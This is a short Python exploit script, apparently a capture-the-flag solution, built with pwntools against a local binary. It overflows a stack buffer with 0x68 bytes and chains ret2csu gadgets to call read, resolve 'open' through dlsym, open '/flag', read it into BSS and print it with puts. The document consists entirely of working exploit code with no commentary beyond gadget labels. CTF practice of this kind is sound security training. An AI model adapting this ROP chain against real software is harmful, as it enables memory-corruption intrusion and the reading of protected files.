from pwn import *

CSE_1       = 0x40185a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSE_2       = 0x401840  # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
POP_RDI     = 0x401863  # pop rdi; ret
POP_RSI_R15 = 0x401861  # pop rsi; pop r15; ret
READ_GOT    = 0x404030
DLSYM_GOT   = 0x404040
PUTS_PLT    = 0x4010a0
JMP_RAX     = 0x40114c
BSS         = 0x404080

context.arch      = "amd64"
context.os        = "linux"
context.log_level = "info"

p = process('<binary>')

rop = flat(
    CSE_1,  0, 1,  0,       BSS,  16,  READ_GOT,
    CSE_2,
    0, 0, 0, 0, 0, 0, 0,

    CSE_1,  0, 1,  0,       BSS,  0,   DLSYM_GOT,
    CSE_2,
    0, 0, 0, 0, 0, 0, 0,

    POP_RDI,    BSS + 8,
    POP_RSI_R15, 0, 0,      # rsi=0 (O_RDONLY), r15 junk
    JMP_RAX,                # open("/flag", 0) -> fd in rax

    CSE_1,  0, 1,  3,       BSS,  100, READ_GOT,
    CSE_2,
    0, 0, 0, 0, 0, 0, 0,

    POP_RDI,    BSS,
    PUTS_PLT,
)

payload  = b'A' * 0x68
payload += rop
p.send(payload)
p.recvuntil(b'Leaving')
p.send(b'open\x00\x00\x00\x00' + b'/flag\x00\x00\x00')

flag = p.recvall(timeout=2)
log.success(f'Flag: {flag.strip()}')
p.close()
